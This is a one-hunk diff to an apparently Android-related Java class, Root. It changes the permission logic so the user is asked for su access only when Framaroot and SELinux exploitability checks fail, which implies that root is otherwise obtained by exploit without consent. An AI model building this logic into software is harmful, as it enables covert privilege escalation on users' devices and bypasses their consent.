@@ -527,7 +527,7 @@ public class Root {
 					+ Keys.self().wantsPrivilege());
 		}
 
-		if (Status.haveSu() == true && Status.haveRoot() == false && Keys.self().wantsPrivilege()) {
+		if (Status.haveSu() == true && Status.haveRoot() == false && Keys.self().wantsPrivilege() && !(checkFramarootExploitability() || checkSELinuxExploitability())) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getPermissions), ask the user");
 			}
